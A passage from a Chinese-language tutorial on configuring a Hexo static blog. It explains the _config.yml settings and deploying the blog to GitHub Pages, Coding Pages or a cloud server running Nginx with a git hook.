style="text-align:left">网站描述</td></tr><tr><td style="text-align:left"><code>author</code></td><td style="text-align:left">您的名字</td></tr><tr><td style="text-align:left"><code>language</code></td><td style="text-align:left">网站使用的语言</td></tr><tr><td style="text-align:left"><code>timezone</code></td><td style="text-align:left">网站时区。Hexo 默认使用您电脑的时区。<a href="https://en.wikipedia.org/wiki/List_of_tz_database_time_zones" target="_blank" rel="noopener">时区列表</a>。比如说：<code>America/New_York</code>, <code>Japan</code>, 和 <code>UTC</code> 。</td></tr></tbody></table><p>其中，<code>description</code>主要用于SEO，告诉搜索引擎一个关于您站点的简单描述，通常建议在其中包含您网站的关键词。<code>author</code>参数用于主题显示文章的作者。</p><h3 id="网址"><a href="#网址" class="headerlink" title="网址"></a>网址</h3><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">描述</th><th style="text-align:left">默认值</th></tr></thead><tbody><tr><td style="text-align:left"><code>url</code></td><td style="text-align:left">网址</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>root</code></td><td style="text-align:left">网站根目录</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>permalink</code></td><td style="text-align:left">文章的 <a href="https://hexo.io/zh-cn/docs/permalinks" target="_blank" rel="noopener">永久链接</a> 格式</td><td style="text-align:left"><code>:year/:month/:day/:title/</code></td></tr><tr><td style="text-align:left"><code>permalink_defaults</code></td><td style="text-align:left">永久链接中各部分的默认值</td></tr></tbody></table><blockquote><p>网站存放在子目录</p><p>如果您的网站存放在子目录中，例如 <code>http://yoursite.com/blog</code>，则请将您的 <code>url</code>设为 <code>http://yoursite.com/blog</code> 并把 <code>root</code> 设为 <code>/blog/</code>。</p></blockquote><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">描述</th><th style="text-align:left">默认值</th></tr></thead><tbody><tr><td style="text-align:left"><code>source_dir</code></td><td style="text-align:left">资源文件夹，这个文件夹用来存放内容。</td><td style="text-align:left"><code>source</code></td></tr><tr><td style="text-align:left"><code>public_dir</code></td><td style="text-align:left">公共文件夹，这个文件夹用于存放生成的站点文件。</td><td style="text-align:left"><code>public</code></td></tr><tr><td style="text-align:left"><code>tag_dir</code></td><td style="text-align:left">标签文件夹</td><td style="text-align:left"><code>tags</code></td></tr><tr><td style="text-align:left"><code>archive_dir</code></td><td style="text-align:left">归档文件夹</td><td style="text-align:left"><code>archives</code></td></tr><tr><td style="text-align:left"><code>category_dir</code></td><td style="text-align:left">分类文件夹</td><td style="text-align:left"><code>categories</code></td></tr><tr><td style="text-align:left"><code>code_dir</code></td><td style="text-align:left">Include code 文件夹</td><td style="text-align:left"><code>downloads/code</code></td></tr><tr><td style="text-align:left"><code>i18n_dir</code></td><td style="text-align:left">国际化（i18n）文件夹</td><td style="text-align:left"><code>:lang</code></td></tr><tr><td style="text-align:left"><code>skip_render</code></td><td style="text-align:left">跳过指定文件的渲染，您可使用 <a href="https://github.com/isaacs/node-glob" target="_blank" rel="noopener">glob 表达式</a>来匹配路径。</td></tr></tbody></table><blockquote><p>提示</p><p>如果您刚刚开始接触Hexo，通常没有必要修改这一部分的值。</p></blockquote><h3 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h3><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">描述</th><th style="text-align:left">默认值</th></tr></thead><tbody><tr><td style="text-align:left"><code>new_post_name</code></td><td style="text-align:left">新文章的文件名称</td><td style="text-align:left">:title.md</td></tr><tr><td style="text-align:left"><code>default_layout</code></td><td style="text-align:left">预设布局</td><td style="text-align:left">post</td></tr><tr><td style="text-align:left"><code>auto_spacing</code></td><td style="text-align:left">在中文和英文之间加入空格</td><td style="text-align:left">false</td></tr><tr><td style="text-align:left"><code>titlecase</code></td><td style="text-align:left">把标题转换为 title case</td><td style="text-align:left">false</td></tr><tr><td style="text-align:left"><code>external_link</code></td><td style="text-align:left">在新标签中打开链接</td><td style="text-align:left">true</td></tr><tr><td style="text-align:left"><code>filename_case</code></td><td style="text-align:left">把文件名称转换为 (1) 小写或 (2) 大写</td><td style="text-align:left">0</td></tr><tr><td style="text-align:left"><code>render_drafts</code></td><td style="text-align:left">显示草稿</td><td style="text-align:left">false</td></tr><tr><td style="text-align:left"><code>post_asset_folder</code></td><td style="text-align:left">启动 <a href="https://hexo.io/zh-cn/docs/asset-folders" target="_blank" rel="noopener">Asset 文件夹</a></td><td style="text-align:left">false</td></tr><tr><td style="text-align:left"><code>relative_link</code></td><td style="text-align:left">把链接改为与根目录的相对位址</td><td style="text-align:left">false</td></tr><tr><td style="text-align:left"><code>future</code></td><td style="text-align:left">显示未来的文章</td><td style="text-align:left">true</td></tr><tr><td style="text-align:left"><code>highlight</code></td><td style="text-align:left">代码块的设置</td></tr></tbody></table><blockquote><p>相对地址</p><p>默认情况下，Hexo生成的超链接都是绝对地址。例如，如果您的网站域名为<code>example.com</code>,您有一篇文章名为<code>hello</code>，那么绝对链接可能像这样：<code>http://example.com/hello.html</code>，它是<strong>绝对</strong>于域名的。相对链接像这样：<code>/hello.html</code>，也就是说，无论用什么域名访问该站点，都没有关系，这在进行反向代理时可能用到。通常情况下，建议使用绝对地址。</p></blockquote><h3 id="分类-amp-标签"><a href="#分类-amp-标签" class="headerlink" title="分类 &amp; 标签"></a>分类 &amp; 标签</h3><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">描述</th><th style="text-align:left">默认值</th></tr></thead><tbody><tr><td style="text-align:left"><code>default_category</code></td><td style="text-align:left">默认分类</td><td style="text-align:left"><code>uncategorized</code></td></tr><tr><td style="text-align:left"><code>category_map</code></td><td style="text-align:left">分类别名</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>tag_map</code></td><td style="text-align:left">标签别名</td></tr></tbody></table><h3 id="日期-时间格式"><a href="#日期-时间格式" class="headerlink" title="日期 / 时间格式"></a>日期 / 时间格式</h3><p>Hexo 使用 <a href="http://momentjs.com/" target="_blank" rel="noopener">Moment.js</a> 来解析和显示时间。</p><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">描述</th><th style="text-align:left">默认值</th></tr></thead><tbody><tr><td style="text-align:left"><code>date_format</code></td><td style="text-align:left">日期格式</td><td style="text-align:left"><code>YYYY-MM-DD</code></td></tr><tr><td style="text-align:left"><code>time_format</code></td><td style="text-align:left">时间格式</td><td style="text-align:left"><code>H:mm:ss</code></td></tr></tbody></table><h3 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h3><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">描述</th><th style="text-align:left">默认值</th></tr></thead><tbody><tr><td style="text-align:left"><code>per_page</code></td><td style="text-align:left">每页显示的文章量 (0 = 关闭分页功能)</td><td style="text-align:left"><code>10</code></td></tr><tr><td style="text-align:left"><code>pagination_dir</code></td><td style="text-align:left">分页目录</td><td style="text-align:left"><code>page</code></td></tr></tbody></table><h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>theme</code></td><td style="text-align:left">当前主题名称。值为<code>false</code>时禁用主题</td></tr><tr><td style="text-align:left"><code>deploy</code></td><td style="text-align:left">部署部分的设置</td></tr></tbody></table><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>当执行完<code>npm install</code>之后即可通过<code>hexo s</code>或者<code>hexo serve</code>通过本地访问hexo博客。</p><p>此时博客已搭建在本地了。</p><h5 id="方案一：GithubPages"><a href="#方案一：GithubPages" class="headerlink" title="方案一：GithubPages"></a>方案一：GithubPages</h5><ol><li><p>创建<a href="https://link.juejin.im?target=https%3A%2F%2Fgithub.com" target="_blank" rel="noopener">Github</a>账号</p></li><li><p>创建仓库， 仓库名为：&lt;Github账号名称&gt;.github.io</p></li><li><p>将本地Hexo博客推送到GithubPages</p><p>3.1. 安装<code>hexo-deployer-git</code>插件。在命令行（即Git Bash）运行以下命令即可：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm <span class="keyword">install</span> hexo-deployer-git <span class="comment">--save</span></span><br></pre></td></tr></table></figure><p>3.2. 添加SSH key。</p><ul><li><p>创建一个 SSH key 。在命令行（即Git Bash）输入以下命令， 回车三下即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ssh-keygen -t rsa -C <span class="string">"邮箱地址"</span></span></span><br></pre></td></tr></table></figure></li><li><p>添加到 github。 复制密钥文件内容（路径形如<code>C:\Users\Administrator\.ssh\id_rsa.pub</code>），粘贴到<a href="https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fsettings%2Fkeys" target="_blank" rel="noopener">New SSH Key</a>即可。</p></li><li><p>测试是否添加成功。在命令行（即Git Bash）依次输入以下命令，返回“You’ve successfully authenticated”即成功：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>ssh -T git<span class="variable">@github</span>.com</span><br><span class="line"><span class="variable">$ </span>yes</span><br></pre></td></tr></table></figure></li></ul><p>3.3. 修改<code>_config.yml</code>（在站点目录下）。文件末尾修改为：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># Deployment</span></span><br><span class="line"><span class="meta">## Docs: https:<span class="comment">//hexo.io/docs/deployment.html</span></span></span><br><span class="line"><span class="symbol">deploy:</span></span><br><span class="line"><span class="symbol">  type:</span> git</span><br><span class="line"><span class="symbol">  repo:</span> git@github.com:<span class="params">&lt;Github账号名称&gt;</span>/<span class="params">&lt;Github账号名称&gt;</span>.github.io.git</span><br><span class="line"><span class="symbol">  branch:</span> master</span><br></pre></td></tr></table></figure><p>注意：上面仓库地址写ssh地址，不写http地址。</p><p>3.4. 推送到GithubPages。在命令行（即Git Bash）依次输入以下命令， 返回<code>INFO Deploy done: git</code>即成功推送：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo g</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> hexo d</span></span><br></pre></td></tr></table></figure></li><li><p>等待1分钟左右，浏览器访问网址： <code>https://&lt;Github账号名称&gt;.github.io</code></p></li></ol><p>至此，您的Hexo博客已经搭建在GithubPages, 域名为<code>https://&lt;Github账号名称&gt;.github.io</code>。</p><h5 id="方案二：GithubPages-域名"><a href="#方案二：GithubPages-域名" class="headerlink" title="方案二：GithubPages + 域名"></a>方案二：GithubPages + 域名</h5><p>在方案一的基础上，添加自定义域名（您购买的域名）。</p><ol><li><p>域名解析。</p><p>类型选择为 CNAME；</p><p>主机记录即域名前缀，填写为www；</p><p>记录值填写为自定义域名；</p><p>解析线路，TTL 默认即可。</p></li><li><p>仓库设置。</p><p>2.1. 打开博客仓库设置：<code>https://github.com/&lt;Github账号名称&gt;/&lt;Github账号名称&gt;.github.io/settings</code></p><p>2.2. 在Custom domain下，填写自定义域名，点击<code>save</code>。</p><p>2.3. 在站点目录的<code>source</code>文件夹下，创建并打开<code>CNAME.txt</code>，写入你的域名（如<code>www.simon96.online</code>），保存，并重命名为<code>CNAME</code>。</p></li><li><p>等待10分钟左右。</p><p>浏览器访问自定义域名。</p><p>至此，您的Hexo博客已经解析到自定义域名，<code>https://&lt;Github账号名称&gt;.github.io</code>依然可用。</p><p>（可在github仓库中设置跳转至个人域名）</p></li></ol><h6 id="绑定域名"><a href="#绑定域名" class="headerlink" title="绑定域名"></a><strong>绑定域名</strong></h6><p>虽然在Internet上可以访问我们的网站，但是网址是GitHub提供的:<a href="https://link.zhihu.com/?target=http%3A//xxxx.github.io" target="_blank" rel="noopener">http://xxxx.github.io</a> (知乎排版可能会出现”http://“字样) 而我们想使用我们自己的个性化域名，这就需要绑定我们自己的域名。这里演示的是在阿里云万网的域名绑定，在国内主流的域名代理厂商也就阿里云和腾讯云。登录到阿里云，进入管理控制台的域名列表，找到你的个性化域名，进入解析</p><p><img src="https://magic-king.net/images/loading.gif" data-original="https://pic3.zhimg.com/80/v2-47323ad4490e206aef93a3d68f0670b6_hd.jpg" alt="img"></p><p>然后添加解析</p><p><img src="https://magic-king.net/images/loading.gif" data-original="https://pic3.zhimg.com/80/v2-40222b3a295bb692aac22829a8ec3be2_hd.jpg" alt="img"></p><p>包括添加三条解析记录，192.30.252.153是GitHub的地址，你也可以ping你的 <a href="https://link.zhihu.com/?target=http%3A//xxxx.github.io" target="_blank" rel="noopener">http://xxxx.github.io</a> 的ip地址，填入进去。第三个记录类型是CNAME，CNAME的记录值是：你的用户名.<a href="https://link.zhihu.com/?target=http%3A//github.io" target="_blank" rel="noopener">http://github.io</a> 这里千万别弄错了。第二步，登录GitHub，进入之前创建的仓库，点击settings，设置Custom domain，输入你的域名</p><p><img src="https://magic-king.net/images/loading.gif" data-original="https://pic4.zhimg.com/80/v2-85ba6dda906f22dea4c03df2b47d994b_hd.jpg" alt="img"></p><p>点击save保存。第三步，进入本地博客文件夹 ，进入blog/source目录下，创建一个记事本文件，输入你的域名，对，只要写进你自己的域名即可。如果带有www，那么以后访问的时候必须带有www完整的域名才可以访问，但如果不带有www，以后访问的时候带不带www都可以访问。所以建议，不要带有www。这里我还是写了www(不建议带有www):</p><p><img src="https://magic-king.net/images/loading.gif" data-original="https://pic1.zhimg.com/80/v2-79abfff91af3f520e24cb91acf6aa994_hd.jpg" alt="img"></p><p>保存，命名为CNAME ，注意保存成<strong>所有文件</strong>而不是<strong>txt文件</strong>。</p><p>完成这三步，进入blog目录中，按住shift键右击打开命令行，依次输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>这时候打开浏览器在地址栏输入你的个性化域名将会直接进入你自己搭建的网站。</p><h5 id="方案三：GithubPages-CodingPages-域名"><a href="#方案三：GithubPages-CodingPages-域名" class="headerlink" title="方案三：GithubPages + CodingPages + 域名"></a>方案三：GithubPages + CodingPages + 域名</h5><p>GithubPages 在国内较慢，百度不收录，而CodingPages 在国外较快。所以在方案二的基础上，添加CodingPages 。</p><ol><li><p>创建<a href="https://link.juejin.im?target=https%3A%2F%2Fcoding.net%2F" target="_blank" rel="noopener">Coding</a>账号</p></li><li><p>创建仓库， 仓库名为：&lt;Coding账号名称&gt;</p></li><li><p>进入项目里『代码』页面，点击『一键开启静态 Pages』，稍等片刻CodingPages即可部署成功。</p></li><li><p>将本地Hexo博客推送到CodingPages</p><p>4.1. 鉴于创建GithubPages 时，已经生成过公钥。可直接复制密钥文件内容（路径形如<code>C:\Users\Administrator\.ssh\id_rsa.pub</code>）， 粘贴到<a href="https://link.juejin.im?target=https%3A%2F%2Fdev.tencent.com%2Fuser%2Faccount%2Fsetting%2Fkeys" target="_blank" rel="noopener">新增公钥</a>。</p><p>4.2. 测试是否添加成功。在命令行（即Git Bash）依次输入以下命令，返回“You’ve successfully authenticated”即成功：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>ssh -T git<span class="variable">@git</span>.coding.net</span><br><span class="line"><span class="variable">$ </span>yes</span><br></pre></td></tr></table></figure><p>4.3. 修改<code>_config.yml</code>（在存放Hexo初始化文件的路径下）。文件末尾修改为：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># Deployment</span></span><br><span class="line"><span class="meta">## Docs: https:<span class="comment">//hexo.io/docs/deployment.html</span></span></span><br><span class="line"><span class="symbol">deploy:</span></span><br><span class="line">- type: git</span><br><span class="line"><span class="symbol">  repo:</span> git@github.com:<span class="params">&lt;Github账号名称&gt;</span>/<span class="params">&lt;Github账号名称&gt;</span>.github.io.git</span><br><span class="line"><span class="symbol">  branch:</span> master</span><br><span class="line">- type: git</span><br><span class="line"><span class="symbol">  repo:</span> git@git.dev.tencent.com:<span class="params">&lt;Coding账号名称&gt;</span>/<span class="params">&lt;Coding账号名称&gt;</span>.git</span><br><span class="line"><span class="symbol">  branch:</span> master</span><br></pre></td></tr></table></figure><p>4.4. 推送到GithubPages。在命令行（即Git Bash）依次输入以下命令， 返回<code>INFO Deploy done: git</code>即成功推送：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo g</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> hexo d</span></span><br></pre></td></tr></table></figure></li><li><p>域名解析</p><ol><li><p>添加 CNAME 记录指向 &lt;Coding账号名称&gt;.coding.me</p><p>类型选择为 CNAME；</p><p>主机记录即域名前缀，填写为www；</p><p>记录值填写为自定义域名；</p><p>解析线路，TTL 默认即可。</p></li><li><p>添加 两条A 记录指向 192.30.252.153和192.30.252.154</p><p>类型选择为 A；</p><p>主机记录即域名前缀，填写为@；</p><p>记录值填写为192.30.252.153和192.30.252.154；</p><p>解析线路，境外或谷歌。</p></li><li><p>在『Pages 服务』设置页（<code>https://dev.tencent.com/u/&lt;Coding账号名称&gt;/p/&lt;Coding账号名称&gt;/git/pages/settings</code>）中绑定自定义域名。</p></li></ol></li></ol><p>至此，您的Hexo博客已经解析到自定义域名，<code>https://&lt;Github账号名称&gt;.github.io</code>和<code>https://&lt;Coding账号名称&gt;.coding.me</code>依然可用。</p><h5 id="方案四：云服务器-域名"><a href="#方案四：云服务器-域名" class="headerlink" title="方案四：云服务器 + 域名"></a>方案四：云服务器 + 域名</h5><p>该方案需要先购买云服务器和域名。</p><ol><li><p>在云服务器安装Git 和 Nginx。(Git 用于版本管理和部署，Nginx 用于静态博客托管。)</p><p>登陆root用户，运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> yum -y update</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> yum install -y git nginx</span></span><br></pre></td></tr></table></figure></li><li><p>Nginx配置</p><p>2.1. 创建文件目录(用于博客站点文件存放)</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/<span class="keyword">local</span>/</span><br><span class="line"><span class="keyword">mkdir</span> hexo</span><br><span class="line"><span class="keyword">chmod</span> <span class="number">775</span> -R /usr/<span class="keyword">local</span>/hexo/</span><br></pre></td></tr></table></figure><p>2.2. 添加 index.html(用于检测配置 Nginx 是否成功)</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim <span class="regexp">/usr/</span>local<span class="regexp">/hexo/i</span>ndex.html</span><br></pre></td></tr></table></figure><p>添加以下代码，并保存。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Nginx running<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2.3. 配置 Nginx 服务器</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">vim</span> /etc/nginx/nginx.<span class="keyword">conf</span></span><br></pre></td></tr></table></figure><p>修改server_name和root：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">      <span class="attribute">listen</span>       <span class="number">80</span> default_server;</span><br><span class="line">      <span class="attribute">listen</span>       [::]:<span class="number">80</span> default_server;</span><br><span class="line">      <span class="attribute">server_name</span>  www.baidu.com; <span class="comment"># 填个人域名      </span></span><br><span class="line">      <span class="attribute">root</span>         /usr/local/hexo/;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>2.4. 启动nginx服务；</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service nginx <span class="literal">start</span></span><br></pre></td></tr></table></figure><p>2.5. 云服务器浏览器访问个人域名或IP，若跳转index.html，则配置完成，否则检查以上配置。</p></li><li><p>git配置</p><p>3.1. 创建文件目录, 用于私人 Git 仓库搭建, 并更改目录读写权限。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/<span class="keyword">local</span>/</span><br><span class="line"><span class="keyword">mkdir</span> hexoRepo</span><br><span class="line"><span class="keyword">chmod</span> <span class="number">775</span> -R /usr/<span class="keyword">local</span>/hexoRepo/</span><br></pre></td></tr></table></figure><p>3.2. Git 初始化裸库。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> hexoRepo/</span><br><span class="line">git init <span class="params">--bare</span> hexo.git</span><br></pre></td></tr></table></figure><p>3.3. 创建 Git 钩子(hook)。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim <span class="regexp">/usr/</span>local<span class="regexp">/hexoRepo/</span>hexo.git<span class="regexp">/hooks/</span>post-receive</span><br></pre></td></tr></table></figure><p>3.4. 输入以下信息，用于指定 Git 的源代码 和 Git 配置文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">git --work-tree=/usr/<span class="built_in">local</span>/hexo --git-dir=/usr/<span class="built_in">local</span>/hexoRepo/hexo.git checkout -f</span><br></pre></td></tr></table></figure><p>3.5. 保存并退出后, 给该文件添加可执行权限。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x <span class="regexp">/usr/</span>local<span class="regexp">/hexoRepo/</span>hexo.git<span class="regexp">/hooks/</span>post-receive</span><br></pre></td></tr></table></figure></li><li><p>本地博客推送到云服务器</p><p>4.1. 安装<code>hexo-deployer-git</code>插件。在命令行（即Git Bash）运行以下命令即可：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm <span class="keyword">install</span> hexo-deployer-git <span class="comment">--save</span></span><br></pre></td></tr></table></figure><p>4.2. 添加SSH key。</p><ul><li><p>创建一个 SSH key 。在命令行（即Git Bash）输入以下命令， 回车三下即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ssh-keygen -t rsa -C <span class="string">"邮箱地址"</span></span></span><br></pre></td></tr></table></figure></li><li><p>添加到 github。 复制密钥文件内容（路径形如<code>C:\Users\Administrator\.ssh\id_rsa.pub</code>），粘贴到<a href="https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fsettings%2Fkeys" target="_blank" rel="noopener">New SSH Key</a>即可。</p></li><li><p>测试是否添加成功。在命令行（即Git Bash）依次输入以下命令，返回“You’ve successfully authenticated”即成功：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>ssh -T git<span class="variable">@github</span>.com</span><br><span class="line"><span class="variable">$ </span>yes</span><br></pre></td></tr></table></figure></li></ul><p>4.3. 修改<code>_config.yml</code>（在站点目录下）。文件末尾修改为：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># Deployment</span></span><br><span class="line"><span class="meta">## Docs: https:<span class="comment">//hexo.io/docs/deployment.html</span></span></span><br><span class="line"><span class="symbol">deploy:</span></span><br><span class="line"><span class="symbol">  type:</span> git</span><br><span class="line"><span class="symbol">  repo:</span> root@xxx.xxx.xxx.xxx:<span class="meta-keyword">/usr/</span>local/hexoRepo/hexo  <span class="comment">//用户名@域名或 IP 地址:/usr/local/hexoRepo/hexo</span></span><br><span class="line"><span class="symbol">  branch:</span> master</span><br></pre></td></tr></table></figure><p>注意：上面仓库地址写ssh地址，不写http地址。</p><p>4.4. 推送到GithubPages。在命令行（即Git Bash）依次输入以下命令， 返回<code>INFO Deploy done: git</code>即成功推送：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo g</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> hexo d</span></span><br></pre></td></tr></table></figure></li><li><p>等待1分钟左右，浏览器访问个人域名。</p><p>至此，您的Hexo博客已经搭建在云服务器, 域名为个人域名。</p></li></ol><h2 id="Hexo常用命令"><a href="#Hexo常用命令" class="headerlink" title="Hexo常用命令"></a>Hexo常用命令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hexo new "postName" #新建文章</span><br><span class="line">hexo new page "pageName" #新建页面</span><br><span class="line">hexo clean #清除部署緩存</span><br><span class="line">hexo n == hexo new #新建文章</span><br><span class="line">hexo g == hexo generate #生成静态页面至public目录</span><br><span class="line">hexo s == hexo server #开启预览访问端口（默认端口4000，可在浏览器输入localhost:4000预览）</span><br><span class="line">hexo d == hexo deploy #将.deploy目录部署到GitHub</span><br><span class="line">hexo g -d #生成加部署</span><br><span class="line">hexo g -s #生成加预览</span><br></pre></td></tr></table></figure><p><strong>注：</strong>当本地预览和远程部署的浏览结果不同的时候，不妨使用<code>hexo clean &amp;&amp; hexo g -d</code>试试。</p><h4 id="创建文章"><a href="#创建文章" class="headerlink" title="创建文章"></a>创建文章</h4><p>命令：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hexo <span class="keyword">new</span> [layout] &lt;<span class="built_in">title</span>&gt;</span><br><span class="line"></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li>[layout]可以为以下三种：</li></ul><table><thead><tr><th>参数名</th><th>功能</th><th>文章路径</th></tr></thead><tbody><tr><td>post</td><td>新建博文</td><td>source/_posts</td></tr><tr><td>page</td><td>新建页面（如404，分类）</td><td>source</td></tr><tr><td>draft</td><td>草稿</td><td>source/_drafts</td></tr></tbody></table><p>草稿可通过一下命令发布：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo publish [layout] &lt;title&gt;</span></span><br><span class="line"></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><ul><li><p>title注意：</p><p>不是博文标题，</p><p>是博文markdown文件的名字，</p><p>也是博文链接的后缀（如<code>https://www.simon96.online/2018/10/12/hexo-tutorial/</code>中的hexo-tutorial）</p></li></ul><h4 id="文章模版"><a href="#文章模版" class="headerlink" title="文章模版"></a>文章模版</h4><ul><li><p>创建模版</p><p>在新建文章时，Hexo 会根据 <code>scaffolds</code> 文件夹内相对应的文件来建立文件，例如：</p></li></ul><blockquote><p>$ hexo new blog “simon”</p></blockquote><p>​    在执行这行指令时，Hexo 会尝试在 <code>scaffolds</code> 